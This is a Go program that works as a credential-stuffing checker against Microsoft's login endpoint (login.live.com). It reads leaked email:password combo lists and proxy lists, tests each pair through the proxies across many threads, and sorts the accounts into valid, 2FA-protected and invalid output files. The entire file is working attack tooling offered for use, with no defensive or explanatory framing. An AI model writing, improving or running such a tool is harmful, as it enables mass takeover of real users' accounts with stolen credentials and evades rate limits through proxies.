package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
)

type config struct {
	Threads int    `json:"threads"`
	Proxy   string `json:"proxy"`
}

func main() {
	// Read config
	config := readConfig("./config.json")

	var wg sync.WaitGroup
	wg.Add(1)

	comboChannel := make(chan string, 10)
	proxies := []string{}

	// Read proxies from file
	readProxies("./input/proxies.txt", &proxies)

	// Start goroutine to read combos from file
	go readFile("./input/combos.txt", comboChannel, &wg)

	// Create channels for results
	validChan := make(chan string, 10)
	tfaChan := make(chan string, 10)
	invalidChan := make(chan string, 10)

	wg.Add(1)
	// Check credentials using threads and proxies
	go checkCredentialsWithProxies(comboChannel, proxies, validChan, tfaChan, invalidChan, &wg, config.Threads)

	wg.Add(3)
	// Save results to files
	go saveFile("./output/valid.txt", validChan, &wg)
	go saveFile("./output/2fa.txt", tfaChan, &wg)
	go saveFile("./output/invalid.txt", invalidChan, &wg)

	wg.Wait()
}

// checkCredentialsWithProxies checks the credentials using the given proxies
func checkCredentialsWithProxies(comboChan chan string, proxies []string, validChan, tfaChan, invalidChan chan string, wg *sync.WaitGroup, threads int) {
	defer wg.Done()

	var wg1 sync.WaitGroup
	wg1.Add(threads)
	for i := 0; i < threads; i++ {
		go func() {
			defer wg1.Done()
			checkCredentials(comboChan, proxies, validChan, tfaChan, invalidChan)
		}()
	}
	wg1.Wait()
	close(validChan)
	close(invalidChan)
	close(tfaChan)
}

// checkCredentials checks the credentials using the given proxies
func checkCredentials(comboChan chan string, proxies []string, validChan, tfaChan, invalidChan chan string) {
	for combo := range comboChan {
		parts := strings.Split(combo, ":")
		email, password := parts[0], parts[1]

		for _, proxy := range proxies {
			result := combo + " - " + proxy
			resp, err := checkWithProxy(email, password, proxy)
			if err != nil {
				invalidChan <- combo + " - " + proxy
				log.Println(result + "- invalid")
				continue
			}

			if resp.StatusCode == 200 {
				validChan <- combo + " - " + proxy
				log.Println(result + "- valid")
			} else if resp.StatusCode == 302 {
				tfaChan <- combo + " - " + proxy
				log.Println(result + "- 2fa")
			} else {
				invalidChan <- combo + " - " + proxy
				log.Println(result + "- invalid")
			}

			resp.Body.Close()
		}
	}
}

// checkWithProxy checks the credentials using the given proxy
func checkWithProxy(email, password, proxy string) (*http.Response, error) {
	// Define the proxy URL
	proxyURL, err := url.Parse(proxy)
	if err != nil {
		return nil, err
	}

	// Create an HTTP client with the proxy set
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		},
	}

	return client.PostForm("https://login.live.com/login.srf", map[string][]string{
		"login":  {email},
		"passwd": {password},
	})
}

// readConfig reads the configuration from the specified file
func readConfig(path string) config {
	file, err := os.Open(path)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	var config config
	err = json.NewDecoder(file).Decode(&config)
	if err != nil {
		panic(err)
	}
	return config
}

// readProxies reads the proxies from the specified file
func readProxies(path string, proxies *[]string) {
	file, err := os.Open(path)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		result := scanner.Text()
		(*proxies) = append((*proxies), result)
	}
	if err := scanner.Err(); err != nil {
		panic(err)
	}
}

// readFile reads the combos from the specified file and sends them to the channel
func readFile(path string, resChan chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	defer close(resChan)

	file, err := os.Open(path)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		result := scanner.Text()
		resChan <- result
	}
	if err := scanner.Err(); err != nil {
		panic(err)
	}
}

// saveFile saves the results to the specified file
func saveFile(path string, resChan <-chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	file, err := os.Create(path)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	w := bufio.NewWriter(file)
	for result := range resChan {
		fmt.Fprintln(w, result)
	}
	w.Flush()
}
